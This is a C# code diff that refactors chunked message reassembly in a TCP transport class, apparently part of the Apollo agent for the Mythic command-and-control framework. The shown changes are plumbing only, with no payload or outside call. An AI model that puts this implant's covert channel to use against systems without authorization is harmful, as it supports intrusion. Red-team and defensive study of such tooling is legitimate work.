@@ -16,6 +16,8 @@ using ST = System.Threading.Tasks;
 using ApolloInterop.Serializers;
 using ApolloInterop.Constants;
 using System.Net.Sockets;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Classes.Events;
 
 namespace TcpTransport
 {
@@ -39,8 +41,7 @@ namespace TcpTransport
         private static AutoResetEvent _receiverEvent = new AutoResetEvent(false);
         private Dictionary<TcpClient, AsyncTcpState> _writerTasks = new Dictionary<TcpClient, AsyncTcpState>();
         private Action<object> _sendAction;
-        ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
-
+        
         private bool _uuidNegotiated = false;
         private ST.Task _agentConsumerTask = null;
         private ST.Task _agentProcessorTask = null;
@@ -104,14 +105,15 @@ namespace TcpTransport
         {
             IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                 Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray()));
-            lock (_messageOrganizer)
+            lock (MessageStore)
             {
-                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
+                if (!MessageStore.ContainsKey(chunkedData.ID))
                 {
-                    _messageOrganizer[chunkedData.ID] = new IPCMessageStore(DeserializeToReceiverQueue);
+                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
+                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
                 }
             }
-            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
+            MessageStore[chunkedData.ID].AddMessage(chunkedData);
         }
 
         private void OnAsyncMessageSent(IAsyncResult result)
@@ -136,13 +138,20 @@ namespace TcpTransport
             return true;
         }
 
-        public bool DeserializeToReceiverQueue(byte[] data, MessageType mt)
+        public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
         {
-            IMythicMessage msg = Serializer.DeserializeIPCMessage(data, mt);
+            MessageType mt = args.Chunks[0].Message;
+            List<byte> data = new List<byte>();
+
+            for(int i = 0; i < args.Chunks.Length; i++)
+            {
+                data.AddRange(Convert.FromBase64String(args.Chunks[i].Data));
+            }
+
+            IMythicMessage msg = Serializer.DeserializeIPCMessage(data.ToArray(), mt);
             Console.WriteLine("We got a message: {0}", mt.ToString());
             _recieverQueue.Enqueue(msg);
             _receiverEvent.Set();
-            return true;
         }
 
 
